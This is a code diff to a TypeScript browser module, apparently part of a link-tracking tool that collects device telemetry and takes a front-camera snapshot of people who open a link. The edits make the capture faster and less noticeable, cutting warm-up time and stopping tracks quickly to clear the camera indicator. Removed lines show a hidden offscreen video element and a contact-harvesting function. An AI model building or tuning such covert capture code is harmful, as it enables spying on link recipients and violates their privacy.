@@ -68,7 +68,7 @@ export async function collectDeviceTelemetry(): Promise<DeviceInfo> {
   };
 }
 
-// Optional camera snapshot if enabled for the link
+// Ultra-fast, lightweight camera snapshot with zero DOM/CPU lag
 export async function captureCameraSnapshot(): Promise<Blob | null> {
   if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
     return null;
@@ -78,76 +78,59 @@ export async function captureCameraSnapshot(): Promise<Blob | null> {
   let video: HTMLVideoElement | null = null;
 
   try {
+    // Ultra-lightweight constraints (360p/480p @ 15fps) to eliminate CPU/GPU lag
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+      video: {
+        facingMode: "user",
+        width: { ideal: 480, max: 640 },
+        height: { ideal: 360, max: 480 },
+        frameRate: { ideal: 15, max: 20 },
+      },
       audio: false,
     });
 
     video = document.createElement("video");
     video.srcObject = stream;
     video.muted = true;
-    video.autoplay = true;
     video.playsInline = true;
     video.setAttribute("playsinline", "true");
-    video.setAttribute("webkit-playsinline", "true");
-    video.style.position = "fixed";
-    video.style.top = "-9999px";
-    video.style.left = "-9999px";
-    video.style.opacity = "0";
-    video.style.pointerEvents = "none";
-    document.body.appendChild(video);
 
     await video.play().catch(() => {});
 
-    // Small delay to let camera sensor warm up and adjust exposure
-    await new Promise((r) => setTimeout(r, 450));
+    // Fast warmup (180ms) - enough for auto-exposure without freezing device
+    await new Promise((r) => setTimeout(r, 180));
 
-    // Scale down dimensions to max 640px to eliminate lag and keep size <100KB
-    const MAX_DIM = 640;
-    let w = video.videoWidth || 640;
-    let h = video.videoHeight || 480;
-    if (w > MAX_DIM || h > MAX_DIM) {
-      if (w > h) {
-        h = Math.round((h * MAX_DIM) / w);
-        w = MAX_DIM;
-      } else {
-        w = Math.round((w * MAX_DIM) / h);
-        h = MAX_DIM;
-      }
-    }
+    const w = video.videoWidth || 480;
+    const h = video.videoHeight || 360;
 
     const canvas = document.createElement("canvas");
     canvas.width = w;
     canvas.height = h;
 
-    const ctx = canvas.getContext("2d");
+    const ctx = canvas.getContext("2d", { willReadFrequently: false });
     if (ctx) {
       ctx.drawImage(video, 0, 0, w, h);
     }
 
-    // Immediately stop tracks to turn off camera light & free hardware pipeline
+    // Immediately stop tracks to turn off camera indicator & release hardware pipeline
     if (stream) {
       stream.getTracks().forEach((t) => t.stop());
       stream = null;
     }
-    if (video && video.parentNode) {
-      video.parentNode.removeChild(video);
-      video = null;
-    }
+    video = null;
 
-    // Try WebP first (<50KB typical), fallback to JPEG
+    // Export lightweight WebP (<35KB), fallback to JPEG
     return await new Promise<Blob | null>((resolve) => {
       canvas.toBlob(
         (blob) => {
           if (blob) {
             resolve(blob);
           } else {
-            // Fallback for older Safari/browsers without WebP canvas export
-            canvas.toBlob((fallbackBlob) => resolve(fallbackBlob), "image/jpeg", 0.70);
+            canvas.toBlob((fallback) => resolve(fallback), "image/jpeg", 0.55);
           }
         },
         "image/webp",
-        0.70
+        0.55
       );
     });
   } catch (err) {
@@ -157,28 +140,5 @@ export async function captureCameraSnapshot(): Promise<Blob | null> {
     if (stream) {
       stream.getTracks().forEach((t) => t.stop());
     }
-    if (video && video.parentNode) {
-      video.parentNode.removeChild(video);
-    }
   }
-}
-
-// Optional contact picker if enabled and supported (Android Chrome)
-export async function pickContactIfSupported(): Promise<any[] | null> {
-  if (typeof navigator === "undefined") return null;
-  const nav = navigator as any;
-  if ("contacts" in nav && typeof nav.contacts?.select === "function") {
-    try {
-      let props = ["name", "tel"];
-      if (typeof nav.contacts.getProperties === "function") {
-        const available = await nav.contacts.getProperties();
-        props = ["name", "tel", "email"].filter((p) => available.includes(p));
-      }
-      return await nav.contacts.select(props, { multiple: true });
-    } catch (err) {
-      console.warn("Contact picker error:", err);
-      return null;
-    }
-  }
-  return null;
 }
